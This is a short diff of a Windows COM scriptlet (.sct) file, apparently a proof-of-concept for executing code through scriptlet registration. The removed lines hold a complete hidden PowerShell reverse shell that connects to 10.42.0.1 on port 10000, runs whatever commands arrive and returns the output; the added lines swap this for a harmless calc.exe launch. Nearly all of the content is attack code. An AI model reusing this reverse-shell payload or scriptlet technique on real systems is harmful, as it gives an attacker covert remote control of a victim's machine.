@@ -1,13 +1,16 @@
 <?XML version="1.0"?>
 <scriptlet>
-<registration 
-    progid="PoC"
-    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
-                <![CDATA[
-                        var r = new ActiveXObject("WScript.Shell").Run('powershell -w Hidden -c "$client = New-Object System.Net.Sockets.TCPClient(\'10.42.0.1\',10000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"');
+<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>
 
-                ]]>
+<public>
+    <method name="Exec"></method>
+</public>
+
+<script language="JScript">
+<![CDATA[
+	function Exec()	{
+		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+	}
+]]>
 </script>
-</registration>
 </scriptlet>
-
